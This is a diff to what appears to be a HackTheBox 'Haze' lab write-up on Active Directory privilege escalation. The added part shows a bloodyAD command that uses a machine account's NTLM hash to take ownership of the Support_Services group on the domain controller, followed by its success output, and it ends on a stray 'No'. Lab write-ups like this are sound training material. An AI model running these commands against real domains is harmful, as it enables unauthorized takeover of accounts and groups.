@@ -474,3 +474,11 @@ This account has WriteOwner over the support services group
 So the next step is to grab a TGT for the `haze-it-backup$` account then grant ownership to myself over the group, then i can apply GenericAll to the group.
 
 But looking at the members of that group i see there arent any, this could be just something weird with this box, i had to rerun collection several times already so see what right ive got.
+
+# GenericAll on the support services group
+
+```python
+bloodyAD --host dc01.haze.htb -d haze.htb -u 'Haze-IT-Backup$' -p ':76da32697ff38bc7c9fa6289abf47940'  set owner Support_Services 'Haze-IT-Backup$'
+[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by Haze-IT-Backup$ on Support_Services
+```
+No
